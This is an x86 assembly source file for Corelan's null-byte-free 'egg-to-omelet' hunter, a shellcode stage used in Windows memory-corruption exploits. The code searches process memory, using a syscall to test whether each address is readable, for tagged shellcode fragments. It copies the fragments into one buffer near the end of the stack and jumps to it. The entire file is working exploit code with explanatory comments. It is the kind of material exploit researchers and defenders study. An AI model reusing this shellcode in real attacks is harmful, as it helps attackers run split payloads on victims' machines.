;--------------------------------------------------
;corelanc0d3r -  egg-to-omelet hunter - null byte free
;v1.0
;http://www.corelan.be:8800
;peter.ve@corelan.be
;--------------------------------------------------
BITS 32

nr_eggs equ 0x2			;number of eggs
egg_size equ 0x7b		;123 bytes of payload per egg

jmp short start

;routine to calculate the target location 
;for writing recombined shellcode (omelet)
;I'll use EDI as target location
;First, I'll make EDI point to end of stack
;and I'll put the number of shellcode eggs in eax
get_target_loc:
							;get stack pointer and put it in EDI
push esp
pop edi
							;set EDI to end of stack
or di,0xffff				;edi=0x....ffff = end of current stack frame
mov edx,edi         		;use edx as start location for the search
xor eax,eax					;zero eax
mov al,nr_eggs				;put number of eggs in eax
calc_target_loc:
xor esi,esi					;use esi as counter to step back
mov si,0-egg_size+20        ;add 20 bytes of extra space, per egg

get_target_loc_loop:		;start loop
dec edi						;step back
inc esi						;and update ESI counter
cmp si,-1					;continue to step back until ESI = -1
jnz get_target_loc_loop
dec eax						;loop again if we did not take all pieces
							;into account yet
jnz calc_target_loc	
;edi now contains target location for recombined shellcode
xor ebx,ebx					;put loop counter in ebx
mov bl,nr_eggs+1
ret

start:
call get_target_loc			;jump to routine which will calculate shellcode
							;target address

;start looking, using edx as basepointer
jmp short search_next_address
find_egg:
dec edx             ;scasd does edx+4, so dec edx 4 times + inc edx one time
					;  to make sure we don't miss any pointers
dec edx
dec edx
dec edx
search_next_address:
inc edx				;next one
push edx			;save edx
push byte +0x02
pop eax				;set eax to 0x02
int 0x2e
cmp al,0x5			;address readable ?
pop edx				;restore edx
je search_next_address         ;if address is not readable, go to next address
mov eax,0x77303001	;if address is readable, prepare tag in eax
add eax,ebx			;add offset (ebx contains egg counter, remember ?)
xchg edi,edx		;switch edx/edi
scasd				;edi points to the tag ? 
xchg edi,edx		;switch edx/edi back
jnz find_egg		;if tag was not found, go to next address
;found the tag at edx

copy_egg:
;ecx must first be set to egg_size (used by rep instruction)
;and esi as source
mov esi,edx         ;set ESI = EDX (needed for rep instruction)
xor ecx,ecx
mov cl,egg_size     ;set copy counter
rep movsb           ;copy egg from ESI to EDI
dec ebx				;decrement egg
cmp bl,1            ;found all eggs ?
jnz find_egg        ;no = look for next egg
; done - all eggs have been found and copied

done:
call get_target_loc	; re-calculate location where recombined shellcode is placed
jmp edi				; and jump to it :)












